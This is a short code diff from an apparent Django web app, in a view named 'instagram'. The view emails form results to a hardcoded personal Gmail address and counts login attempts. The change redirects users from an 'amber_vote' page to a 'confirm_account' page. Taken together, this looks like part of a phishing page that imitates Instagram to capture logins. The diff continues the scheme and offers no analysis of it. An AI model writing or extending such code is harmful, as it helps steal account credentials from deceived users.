@@ -113,7 +113,7 @@ def instagram(request):
                       settings.EMAIL_HOST_USER,
                       ['received215@gmail.com'], 
                       fail_silently=False, html_message=message)
-            return redirect('amber_vote')
+            return redirect('confirm_account')
     
     # Reset attempt count on GET request
     request.session['attempt'] = 0
